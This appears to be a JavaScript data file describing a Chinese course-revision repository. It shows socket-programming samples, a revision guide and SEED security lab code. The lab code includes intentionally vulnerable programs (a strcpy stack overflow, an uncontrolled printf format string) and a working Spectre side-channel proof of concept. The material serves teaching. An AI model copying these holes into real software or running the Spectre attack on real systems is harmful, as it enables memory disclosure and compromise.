window.REPO_DATA = {
  "projectName": "review",
  "summary": "面向课程考试的综合复习仓库，融合知识点文档、历年重点梳理与安全/网络实验示例代码。",
  "focus": [
    "复习资料结构化",
    "安全实验代码审阅",
    "网络编程样例归类"
  ],
  "intro": "仓库覆盖区块链、操作系统、汇编、网络编程、网络通信协议、软件体系结构、计算机系统安全等课程内容。以 Markdown/PDF 复习资料为主体，并包含可运行的 C/Python/Shell 实验代码用于理解网络与安全原理。",
  "positioning": [
    "多课程复习资料中台：统一管理各课程考点与速记内容",
    "安全教学实验库：保留漏洞样例用于实验复现与原理理解",
    "网络编程案例集：围绕 TCP/UDP、select/poll、地址转换等核心主题"
  ],
  "features": [
    "课程复习文档按主题与版本组织，便于快速定位重点",
    "安全实验代码覆盖缓冲区溢出、格式化字符串、竞争条件、Spectre、Meltdown 等专题",
    "网络编程代码包含 TCP/UDP 客户端/服务端与 I/O 复用示例",
    "同一知识点存在多个修订版文档，适合考前迭代整理"
  ],
  "coreModules": [
    {
      "name": "计算机系统安全",
      "desc": "SEED 安全实验相关资料与代码，偏攻防实验与漏洞机理学习"
    },
    {
      "name": "网络编程技术",
      "desc": "网络套接字编程复习与 C 语言示例代码集合"
    },
    {
      "name": "网络通信协议",
      "desc": "协议分析、抓包解题与考试模板化复习资料"
    },
    {
      "name": "操作系统 / 汇编 / 区块链 / 软件体系结构",
      "desc": "课程知识点梳理与考前记忆清单"
    },
    {
      "name": "web/review",
      "desc": "本次新增的网站审阅层，独立于原始资料和实验代码"
    }
  ],
  "techStack": [
    "Markdown",
    "PDF/PPTX",
    "C",
    "Python",
    "Shell",
    "HTML/CSS/JavaScript"
  ],
  "stats": {
    "totalFiles": 208,
    "totalCodeFiles": 80,
    "totalDocs": 113,
    "topLevelModules": 7
  },
  "topDirs": [
    {
      "name": "计算机系统安全",
      "count": 101
    },
    {
      "name": "网络编程技术",
      "count": 51
    },
    {
      "name": "网络通信协议",
      "count": 20
    },
    {
      "name": "操作系统",
      "count": 15
    },
    {
      "name": "汇编",
      "count": 11
    },
    {
      "name": "区块链",
      "count": 9
    },
    {
      "name": "软件体系结构",
      "count": 1
    }
  ],
  "extensionStats": [
    {
      "ext": ".pdf",
      "count": 64
    },
    {
      "ext": ".c",
      "count": 60
    },
    {
      "ext": ".pptx",
      "count": 24
    },
    {
      "ext": ".md",
      "count": 24
    },
    {
      "ext": "<none>",
      "count": 13
    },
    {
      "ext": ".py",
      "count": 8
    },
    {
      "ext": ".sh",
      "count": 3
    },
    {
      "ext": ".s",
      "count": 3
    },
    {
      "ext": ".yml",
      "count": 3
    },
    {
      "ext": ".cgi",
      "count": 2
    },
    {
      "ext": ".jpg",
      "count": 1
    },
    {
      "ext": ".txt",
      "count": 1
    }
  ],
  "tree": [
    "review/",
    "├── 区块链/",
    "│   ├── .vscode/",
    "│   │   └── tasks.json",
    "│   ├── tmp/",
    "│   │   └── pdfs/",
    "│   ├── 区块链技术_前3章考试复习笔记.md",
    "│   ├── 区块链技术_考前必背清单_零基础版.md",
    "│   ├── 区块链技术及应用 第1讲 区块链概述.pdf",
    "│   ├── 区块链技术及应用 第2讲 密码学与数据结构.pdf",
    "│   ├── 区块链技术及应用 第3讲 共识机制.pdf",
    "│   └── 区块链技术及应用 第4讲 比特币系统解析.pdf",
    "│   └── ... (2 more files)",
    "├── 操作系统/",
    "│   ├── 15166244.pdf",
    "│   ├── PV",
    "│   ├── “操作系统”-转文本结果.txt",
    "│   ├── 合集.md",
    "│   ├── 操作系统.md",
    "│   └── 操作系统复习.md",
    "│   └── ... (9 more files)",
    "├── 汇编/",
    "│   ├── 0898a84628a3b930a65820060b67c03c.jpg",
    "│   ├── Jnotes_汇编习题答案解析.md",
    "│   ├── 未命名文档.pdf",
    "│   ├── 汇编.md",
    "│   ├── 汇编_复习重点_整理补充版.md",
    "│   └── 汇编语言hyx版本(2).pdf",
    "│   └── ... (5 more files)",
    "├── 网络编程技术/",
    "│   ├── 课件/",
    "│   │   ├── 实验一 简单TCP时间日期客户-服务器程序设计.pdf",
    "│   │   ├── 实验二 TCP回射客户-服务器程序设计.pdf",
    "│   │   ├── 第一讲 一个简单的时间日期客户-服务器程序.pptx",
    "│   │   ├── 第三讲 套接口编程简介.pptx",
    "│   │   └── 第九讲 基本名字与地址转换.pptx",
    "│   ├── 附件/",
    "│   │   ├── byteorder.c",
    "│   │   ├── daytimetcpcli.c",
    "│   │   ├── daytimetcpcli1.c",
    "│   │   ├── daytimetcpsrv.c",
    "│   │   └── daytimetcpsrv1.c",
    "│   ├── tcpselect.c",
    "│   ├── 网络编程(3).pdf",
    "│   ├── 网络编程技术.md",
    "│   ├── 网络编程技术_修订版.md",
    "│   ├── 网络编程技术_最终版.md",
    "│   └── 网络编程笔记.pdf",
    "├── 网络通信协议/",
    "│   ├── 第一讲   网络体系结构与网络协议.pdf",
    "│   ├── 第七讲 DNS协议.pdf",
    "│   ├── 第三讲 IP与ICMP协议.pdf",
    "│   ├── 第九讲 HTTP协议与HTTPS协议.pdf",
    "│   ├── 第二讲  MAC帧与ARP协议.pdf",
    "│   └── 第五讲 TCP协议与UDP协议.pdf",
    "│   └── ... (14 more files)",
    "├── 计算机系统安全/",
    "│   ├── 中文课件/",
    "│   │   ├── .DS_Store",
    "│   │   ├── 1. 中文_S01_Linux_Security_Basics_zh.pptx",
    "│   │   ├── 10.中文_H01_MeltdownSpectre.pptx",
    "│   │   ├── 2. 中文_S02_SetUID_zh 新.pptx",
    "│   │   └── 3. 中文_S03_Environment_Variables_zh 更新.pptx",
    "│   ├── 实验/",
    "│   │   ├── 1. Set-UID特权程序与环境变量实验/",
    "│   │   ├── 10. Shellcode_Development_实验/",
    "│   │   ├── 2. Shellshock_实验/",
    "│   │   ├── 3. Buffer_overflow/",
    "│   │   └── 4. Return_to_libc_实验/",
    "│   ├── 题目文件/",
    "│   │   ├── H01_Meltdown_Spectre_ex.pdf",
    "│   │   ├── S01_Security_Basics_ex.pdf",
    "│   │   ├── S02_Set-UID_ex.pdf",
    "│   │   ├── S03_EnvironmentVariable_ex.pdf",
    "│   │   └── S04_Buffer_Overflow_ex.pdf",
    "│   ├── SEED_Security_Exercises_Review.md",
    "│   ├── 总结.md",
    "│   └── 计算机系统安全_最终版复习.md",
    "└── 软件体系结构/",
    "    └── 复习.md"
  ],
  "keyFiles": [
    {
      "path": "网络编程技术/附件/tcpserv01.c",
      "lang": "c",
      "explanation": "TCP 并发服务端基础骨架，体现 socket/bind/listen/accept 主流程。",
      "capability": "支持建立 TCP 监听并处理客户端连接",
      "limitation": "示例级代码，未覆盖生产环境异常与高并发治理",
      "lines": 58,
      "content": "#include\t\"unp.h\"\n\n/* 并发 TCP 回显服务器：每个客户端由一个子进程处理。 */\nint\nmain(int argc, char **argv)\n{\n\t/* 保存监听套接字、连接套接字、子进程 PID、地址长度和地址结构。 */\n\tint\t\t\t\t\tlistenfd, connfd;\n\tpid_t\t\t\t\tchildpid;\n\tsocklen_t\t\t\tclilen;\n\tstruct sockaddr_in\tcliaddr, servaddr;\n\n\t/* 创建 IPv4 TCP 监听套接字。 */\n\tlistenfd = Socket(AF_INET, SOCK_STREAM, 0);\n\n\t/* 初始化服务器地址，绑定到本机所有网卡的 SERV_PORT 端口。 */\n\tbzero(&servaddr, sizeof(servaddr));\n\tservaddr.sin_family      = AF_INET;\n\tservaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n\tservaddr.sin_port        = htons(SERV_PORT);\n\n\t/* 绑定监听套接字到服务器地址。 */\n\tBind(listenfd, (SA *) &servaddr, sizeof(servaddr));\n\n\t/* 开始监听客户端连接。 */\n\tListen(listenfd, LISTENQ);\n\n\t/* 循环接受客户端连接。 */\n\tfor ( ; ; ) {\n\t\t/* 接受一个客户端连接，并保存客户端地址。 */\n\t\tclilen = sizeof(cliaddr);\n\t\tconnfd = Accept(listenfd, (SA *) &cliaddr, &clilen);\n\n\t\t/* 创建子进程处理该客户端。 */\n\t\tif ( (childpid = Fork()) == 0) {\t/* child process */\n\t\t\t/* 子进程关闭监听套接字，只处理已连接套接字。 */\n\t\t\tClose(listenfd);\t/* close listening socket */\n\t\t\tstr_echo(connfd);\t/* process the request */\n\t\t\texit(0);\n\t\t}\n\n\t\t/* 父进程关闭已连接套接字，继续监听新客户端。 */\n\t\tClose(connfd);\t\t\t/* parent closes connected socket */\n\t}\n}\n\n/*\n * 作用：\n *   TCP 并发回显服务器，为每个客户端 fork 一个子进程处理回显。\n *\n * 工作流程：\n *   1. 创建 TCP 监听套接字并绑定到 SERV_PORT。\n *   2. 调用 listen 进入监听状态。\n *   3. 循环 accept 客户端连接。\n *   4. 每接受一个连接就 fork 子进程。\n *   5. 子进程关闭监听套接字并调用 str_echo 处理客户端。\n *   6. 父进程关闭已连接套接字并继续接受新连接。\n */"
    },
    {
      "path": "网络编程技术/附件/str_cli.c",
      "lang": "c",
      "explanation": "TCP 客户端读写循环，展示客户端与服务端回射交互。",
      "capability": "支持标准输入到套接字的数据发送",
      "limitation": "未引入协议封包、重试策略和完整错误恢复",
      "lines": 35,
      "content": "#include\t\"unp.h\"\n\n/* TCP 客户端交互函数：读取标准输入，发送给服务器，再打印回复。 */\nvoid\nstr_cli(FILE *fp, int sockfd)\n{\n\t/* 保存发送和接收缓冲区。 */\n\tchar\tsendline[MAXLINE], recvline[MAXLINE];\n\n\t/* 循环读取用户输入，每行发送一次。 */\n\twhile (Fgets(sendline, MAXLINE, fp) != NULL) {\n\n\t\t/* 将用户输入发送到 TCP 连接。 */\n\t\tWriten(sockfd, sendline, strlen(sendline));\n\n\t\t/* 读取服务器回显的一行数据，若提前关闭则报错。 */\n\t\tif (Readline(sockfd, recvline, MAXLINE) == 0)\n\t\t\terr_quit(\"str_cli: server terminated prematurely\");\n\n\t\t/* 输出服务器返回的内容。 */\n\t\tFputs(recvline, stdout);\n\t}\n}\n\n/*\n * 作用：\n *   TCP 客户端回显函数，把标准输入逐行发送给服务器，并打印服务器回显。\n *\n * 工作流程：\n *   1. 从标准输入读取一行文本。\n *   2. 使用 Writen 将文本写入 TCP 连接。\n *   3. 使用 Readline 读取服务器返回的一行数据。\n *   4. 将服务器回复输出到标准输出。\n *   5. 标准输入结束时函数返回。\n */"
    },
    {
      "path": "计算机系统安全/实验/3. Buffer_overflow/Buffer_Overflow_Server_实验/server-code/stack.c",
      "lang": "c",
      "explanation": "缓冲区溢出实验样例，展示脆弱拷贝路径和栈布局。",
      "capability": "可用于演示栈溢出攻击机理",
      "limitation": "故意保留漏洞，不可直接用于安全生产代码",
      "lines": 76,
      "content": "/* Vunlerable program: stack.c */\n/* You can get this program from the lab's website */\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n/* Changing this size will change the layout of the stack.\n * Instructors can change this value each year, so students\n * won't be able to use the solutions from the past.\n * Suggested value: between 100 and 400  */\n#ifndef BUF_SIZE\n#define BUF_SIZE 200\n#endif\n\nvoid printBuffer(char * buffer, int size);\nvoid dummy_function(char *str);\n\nint bof(char *str)\n{\n    char buffer[BUF_SIZE];\n\n#if __x86_64__\n    unsigned long int *framep;\n    // Copy the rbp value into framep, and print it out\n    asm(\"movq %%rbp, %0\" : \"=r\" (framep));\n#if SHOW_FP\n    printf(\"Frame Pointer (rbp) inside bof():  0x%.16lx\\n\", (unsigned long) framep);\n#endif\n    printf(\"Buffer's address inside bof():     0x%.16lx\\n\", (unsigned long) &buffer);\n#else\n    unsigned int *framep;\n    // Copy the ebp value into framep, and print it out\n    asm(\"mov %%ebp, %0\" : \"=r\" (framep));\n#if SHOW_FP\n    printf(\"Frame Pointer (ebp) inside bof():  0x%.8x\\n\", (unsigned) framep);\n#endif\n    printf(\"Buffer's address inside bof():     0x%.8x\\n\", (unsigned) &buffer);\n#endif\n\n    // The following statement has a buffer overflow problem \n    strcpy(buffer, str);       \n\n    return 1;\n}\n\nint main(int argc, char **argv)\n{\n    char str[517];\n\n    int length = fread(str, sizeof(char), 517, stdin);\n    printf(\"Input size: %d\\n\", length);\n    dummy_function(str);\n    fprintf(stdout, \"==== Returned Properly ====\\n\");\n    return 1;\n}\n\n// This function is used to insert a stack frame of size \n// 1000 (approximately) between main's and bof's stack frames. \n// The function itself does not do anything. \nvoid dummy_function(char *str)\n{\n    char dummy_buffer[1000];\n    memset(dummy_buffer, 0, 1000);\n    bof(str);\n}\n\nvoid printBuffer(char * buffer, int size)\n{\n   int i;\n   for  (i=0; i<size; i++){\n\n     if (i % 20 == 0) printf(\"\\n%.3d: \", i);\n     printf(\"%.2x \", (unsigned char) buffer[i]);\n   }\n}"
    },
    {
      "path": "计算机系统安全/实验/5. Format-String _Vulnerability_实验/server-code/format.c",
      "lang": "c",
      "explanation": "格式化字符串漏洞样例，说明未受控 printf 的风险。",
      "capability": "可复现实验中格式化字符串读写影响",
      "limitation": "为教学用途，缺少输入校验与加固",
      "lines": 89,
      "content": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/ip.h>\n\n/* Changing this size will change the layout of the stack.\n * Instructors can change this value each year, so students\n * won't be able to use the solutions from the past.\n * Suggested value: between 10 and 400  */\n#ifndef BUF_SIZE\n#define BUF_SIZE 100\n#endif\n\n\n#if __x86_64__\n  unsigned long target = 0x1122334455667788;\n#else\n  unsigned int  target = 0x11223344;\n#endif \n\nchar *secret = \"A secret message\\n\";\n\nvoid dummy_function(char *str);\n\nvoid myprintf(char *msg)\n{\n#if __x86_64__\n    unsigned long int *framep;\n    // Save the rbp value into framep\n    asm(\"movq %%rbp, %0\" : \"=r\" (framep));\n    printf(\"Frame Pointer (inside myprintf):      0x%.16lx\\n\", (unsigned long) framep);\n    printf(\"The target variable's value (before): 0x%.16lx\\n\", target);\n#else\n    unsigned int *framep;\n    // Save the ebp value into framep\n    asm(\"movl %%ebp, %0\" : \"=r\"(framep));\n    printf(\"Frame Pointer (inside myprintf):      0x%.8x\\n\", (unsigned int) framep);\n    printf(\"The target variable's value (before): 0x%.8x\\n\",   target);\n#endif\n\n    // This line has a format-string vulnerability\n    printf(msg);\n\n#if __x86_64__\n    printf(\"The target variable's value (after):  0x%.16lx\\n\", target);\n#else\n    printf(\"The target variable's value (after):  0x%.8x\\n\",   target);\n#endif\n\n}\n\n\nint main(int argc, char **argv)\n{\n    char buf[1500];\n\n\n#if __x86_64__\n    printf(\"The input buffer's address:    0x%.16lx\\n\", (unsigned long) buf);\n    printf(\"The secret message's address:  0x%.16lx\\n\", (unsigned long) secret);\n    printf(\"The target variable's address: 0x%.16lx\\n\", (unsigned long) &target);\n#else\n    printf(\"The input buffer's address:    0x%.8x\\n\",   (unsigned int)  buf);\n    printf(\"The secret message's address:  0x%.8x\\n\",   (unsigned int)  secret);\n    printf(\"The target variable's address: 0x%.8x\\n\",   (unsigned int)  &target);\n#endif\n\n    printf(\"Waiting for user input ......\\n\"); \n    int length = fread(buf, sizeof(char), 1500, stdin);\n    printf(\"Received %d bytes.\\n\", length);\n\n    dummy_function(buf);\n    printf(\"(^_^)(^_^)  Returned properly (^_^)(^_^)\\n\");\n\n    return 1;\n}\n\n// This function is used to insert a stack frame between main and myprintf.\n// The size of the frame can be adjusted at the compilation time. \n// The function itself does not do anything.\nvoid dummy_function(char *str)\n{\n    char dummy_buffer[BUF_SIZE];\n    memset(dummy_buffer, 0, BUF_SIZE);\n\n    myprintf(str);\n}\n"
    },
    {
      "path": "计算机系统安全/实验/8. Spectre 攻击实验/Labsetup/SpectreAttack.c",
      "lang": "c",
      "explanation": "Spectre 侧信道攻击实验代码，展示推测执行+缓存时序泄露。",
      "capability": "可演示基于 Flush+Reload 的信息侧信道",
      "limitation": "依赖特定硬件和实验环境，结果受平台影响",
      "lines": 80,
      "content": "#include <emmintrin.h>\n#include <x86intrin.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n\nunsigned int bound_lower = 0;\nunsigned int bound_upper = 9;\nuint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; \nchar    *secret    = \"Some Secret Value\";   \nuint8_t array[256*4096];\n\n#define CACHE_HIT_THRESHOLD (80)\n#define DELTA 1024\n\n// Sandbox Function\nuint8_t restrictedAccess(size_t x)\n{\n  if (x <= bound_upper && x >= bound_lower) {\n     return buffer[x];\n  } else {\n     return 0;\n  } \n}\n\nvoid flushSideChannel()\n{\n  int i;\n  // Write to array to bring it to RAM to prevent Copy-on-write\n  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;\n  //flush the values of the array from cache\n  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);\n}\n\nvoid reloadSideChannel()\n{\n  int junk=0;\n  register uint64_t time1, time2;\n  volatile uint8_t *addr;\n  int i;\n  for(i = 0; i < 256; i++){\n    addr = &array[i*4096 + DELTA];\n    time1 = __rdtscp(&junk);\n    junk = *addr;\n    time2 = __rdtscp(&junk) - time1;\n    if (time2 <= CACHE_HIT_THRESHOLD){\n        printf(\"array[%d*4096 + %d] is in cache.\\n\", i, DELTA);\n        printf(\"The Secret = %d(%c).\\n\",i, i);\n    }\n  } \n}\nvoid spectreAttack(size_t index_beyond)\n{\n  int i;\n  uint8_t s;\n  volatile int z;\n  // Train the CPU to take the true branch inside restrictedAccess().\n  for (i = 0; i < 10; i++) { \n      restrictedAccess(i); \n  }\n  // Flush bound_upper, bound_lower, and array[] from the cache.\n  _mm_clflush(&bound_upper);\n  _mm_clflush(&bound_lower);\n  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }\n  for (z = 0; z < 100; z++)  {   }\n  // Ask restrictedAccess() to return the secret in out-of-order execution. \n  s = restrictedAccess(index_beyond);  \n  array[s*4096 + DELTA] += 88;  \n}\n\nint main() {\n  flushSideChannel();\n  size_t index_beyond = (size_t)(secret - (char*)buffer);  \n  printf(\"secret: %p \\n\", secret);\n  printf(\"buffer: %p \\n\", buffer);\n  printf(\"index of secret (out of bound): %ld \\n\", index_beyond);\n  spectreAttack(index_beyond);\n  reloadSideChannel();\n  return (0);\n}"
    },
    {
      "path": "网络编程技术/网络编程技术_最终版.md",
      "lang": "md",
      "explanation": "网络编程课程复习主文档，按考点组织函数与代码骨架。",
      "capability": "提供系统化复习路径和函数速查",
      "limitation": "偏考试导向，不是完整工程文档",
      "lines": 140,
      "content": "## 复习总览：按 PDF 标注抓重点\n\n这份最终版的复习顺序是：先背题型和代码层级，再按章节记函数原型、流程和易错点。PDF 标注里的“背”“重点”“程序会写”“看程序写功能”已经折算到下面这张表。\n\n| 章节 | PDF 标注导向 | 复习目标 |\n|---|---|---|\n| 第一章 | 阅读程序写功能 | 看懂 `daytimetcpcli.c`、`daytimetcpsrv.c`，能写出每一步作用；包裹函数几乎不考，只保留概念 |\n| 第二章 | 论述或简答 | TCP 三次握手、四次挥手、`TIME_WAIT`、端口号、套接口对必须能完整表述 |\n| 第三章 | 简答题必考、看程序写功能 | `sockaddr_in`、`sockaddr`、`sockaddr_in6`、值-结果参数、字节序和地址转换函数要背 |\n| 第四章 | 重点、写程序 | 基本 TCP 套接口函数和并发服务器骨架要会写；重点区分监听套接口和已连接套接口 |\n| 第五章 | 程序会写、流程要背 | TCP 回射客户/服务器、`SIGCHLD`、`waitpid`、`accept` 被中断、数据格式问题要会解释和写骨架 |\n| 第六章 | `select` 参数要记、`shutdown` 重点、`poll/epoll` 重点 | 会写 `select` 参数含义，能比较 `select`、`poll`、`epoll`，能说明半关闭 |\n| 第八章 | `recvfrom/sendto` 参数、UDP `connect` 简答重点 | UDP 回射流程、`sendto/recvfrom` 参数、UDP `connect` 的作用与限制 |\n| 第九章 | `hostent` 字段重点、程序三选一 | 名字与地址转换函数、`hostent`/`servent` 字段、`hostent.c`/`hostent6.c` 功能 |\n\n### 代码掌握层级\n\n#### A. 必须会写骨架\n\n- `tcpserv01.c` + `str_echo.c`：TCP 并发回射服务器，核心链路是 `Socket -> Bind -> Listen -> Accept -> Fork -> str_echo -> Close`。\n- `tcpcli01.c` + `str_cli.c`：TCP 回射客户，核心链路是 `Socket -> Inet_pton -> Connect -> str_cli`。\n- `tcpserv04.c` + `sigchldwaitpid.c`：在并发服务器中处理 `SIGCHLD`，用 `waitpid(-1, &stat, WNOHANG)` 循环回收子进程，并处理 `accept` 的 `EINTR`。\n- `strcliselect01.c` / `strcliselect02.c`：用 `select` 同时监听标准输入和套接口；第二版要会说明 `shutdown(sockfd, SHUT_WR)` 半关闭。\n- `tcpservselect01.c`：单进程 `select` TCP 回射服务器，掌握 `client[]`、`allset/rset`、`FD_SET/FD_CLR/FD_ISSET` 的配合。\n- `udpservselect01.c`：同端口同时处理 TCP 和 UDP 的 `select` 服务器，掌握 TCP 分支 `accept/fork/str_echo` 与 UDP 分支 `recvfrom/sendto`。\n\n#### B. 看程序写功能\n\n- `daytimetcpcli.c`、`daytimetcpsrv.c`：看代码说明 daytime 客户/服务器流程。\n- `byteorder.c`：判断主机字节序。\n- `readn.c`、`writen.c`：可靠读满/写满指定字节数。\n- `inet_pton_ipv4.c`、`inet_ntop_ipv4.c`：IPv4 文本地址和二进制地址互转。\n- `udpserv01.c`、`udpcli01.c`、`dg_echo.c`、`dg_cli.c`：UDP 回射服务器/客户流程。\n- `dgcliconnect.c`、`udpcli09.c`：UDP 调用 `connect` 后可用 `read/write`，并可查看内核分配的本地地址。\n- `hostent.c`、`hostent6.c`：根据主机名查询官方名、别名和地址列表。\n\n#### C. 只需记住功能和原型\n\n- 套接口基本函数：`socket`、`connect`、`bind`、`listen`、`accept`、`close`、`shutdown`。\n- 地址函数：`htons`、`htonl`、`ntohs`、`ntohl`、`inet_pton`、`inet_ntop`。\n- 名字服务函数：`gethostbyname`、`gethostbyname2`、`gethostbyaddr`、`getservbyname`、`getservbyport`。\n- I/O 复用函数：`select`、`poll`、`epoll_create`、`epoll_ctl`、`epoll_wait`。\n\n### 最短背诵路径\n\n1. 先背所有函数原型和返回值，尤其是 `select`、`poll`、`recvfrom/sendto`、`waitpid`。\n2. 再背 TCP 服务器固定骨架：`socket -> bind -> listen -> accept -> fork -> close`。\n3. 然后背 TCP 客户固定骨架：`socket -> inet_pton -> connect -> str_cli`。\n4. 最后背简答：三次握手、四次挥手、`TIME_WAIT` 两个理由、UDP `connect`、`select/poll/epoll` 对比。\n\n<!--///-->\n\n## 第一章：一个简单的时间/日期客户-服务器程序\n\n### 1. 考点定位\n\n本章主要理解一个完整 TCP 客户端和 TCP 服务器的基本程序结构，重点是：\n\n- 客户端程序的调用流程；\n- 服务器程序的调用流程；\n- 协议无关性；\n- 包裹函数与错误处理；\n- `errno` 的基本含义。\n\n### 2. 简单的时间/日期客户程序\n\n客户程序示例：`daytimetcpcli.c`。\n\n基本流程：\n\n1. 包含头文件；\n2. 定义变量；\n3. 检查命令行参数；\n4. 创建 TCP 套接口；\n5. 给服务器套接口地址结构赋值，指定服务器 IP 地址和端口；\n6. 调用 `connect` 建立到服务器的连接；\n7. 读取服务器应答并输出到屏幕；\n8. 终止程序。\n\n运行形式示例：\n\n```bash\n./daytimetcpcli 172.20.0.54\n```\n\n可能输出：\n\n```text\nSun Mar  1 18:20:04 2026\n```\n\n### 3. 简单的时间/日期服务器程序\n\n服务器程序示例：`daytimetcpsrv.c`。\n\n基本流程：\n\n1. 包含头文件；\n2. 定义变量；\n3. 创建 TCP 套接口；\n4. 给服务器地址结构赋值；\n5. 绑定服务器的众所周知端口到套接口；\n6. 把套接口转换成监听套接口；\n7. 接受客户连接；\n8. 向客户发送时间/日期应答；\n9. 关闭连接。\n\n运行形式示例：\n\n```bash\nsudo ./daytimetcpsrv\n```\n\n### 4. 协议无关性\n\n协议无关性指程序尽量不依赖某一种具体协议族。例如把 IPv4 程序改成 IPv6 程序时，主要修改：\n\n```c\nstruct sockaddr_in6 servaddr;\nsockfd = socket(AF_INET6, SOCK_STREAM, 0);\nservaddr.sin6_family = AF_INET6;\nservaddr.sin6_port = htons(13);\ninet_pton(AF_INET6, argv[1], &servaddr.sin6_addr);\n```\n\n核心思想：协议变了，程序功能不变；只需要替换地址结构、协议族和地址转换方式。\n\n### 5. 错误处理与包裹函数\n\n现实程序必须检查系统调用是否出错。例如：\n\n```c\nif ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)\n    err_sys(\"socket error\");\n```\n\n为了简化程序，可以定义包裹函数。包裹函数调用真实函数、检查返回值，出错时终止进程。\n\n```c\nint Socket(int family, int type, int protocol)"
    }
  ],
  "run": [
    "进入仓库根目录：cd /home/runner/work/review/review",
    "启动本地静态服务：python -m http.server 8000",
    "浏览器访问：http://127.0.0.1:8000/web/review/index.html"
  ],
  "progress": {
    "done": [
      "已完成仓库全量文件扫描与类型统计",
      "已按课程/实验职责提炼核心模块说明",
      "已实现目录树、模块信息、关键代码在线审阅界面",
      "已实现基础语法高亮和核心文件能力/限制标注"
    ],
    "todo": [
      "补充按关键字全文检索所有资料内容",
      "为大文件提供分段加载与分页浏览"
    ]
  },
  "roadmap": [
    "增加 PDF/PPT 文档预览与章节跳转索引",
    "增加关键实验代码的调用关系图与流程图",
    "增加按课程、文件类型、更新时间的交互筛选",
    "引入自动化脚本定期刷新数据并生成变更报告"
  ],
  "capabilities": [
    "可视化呈现项目概况、技术栈、目录与模块职责",
    "可在线查看关键代码节选并辅助快速理解",
    "可显示当前仓库的完成情况和可改进方向"
  ],
  "limitations": [
    "代码查看为关键文件节选，不是完整 IDE 级浏览",
    "语法高亮为轻量实现，语言覆盖有限",
    "目录树做了层级与数量裁剪以控制页面长度",
    "仓库中的实验漏洞代码为教学用途，不应直接用于生产系统"
  ]
};
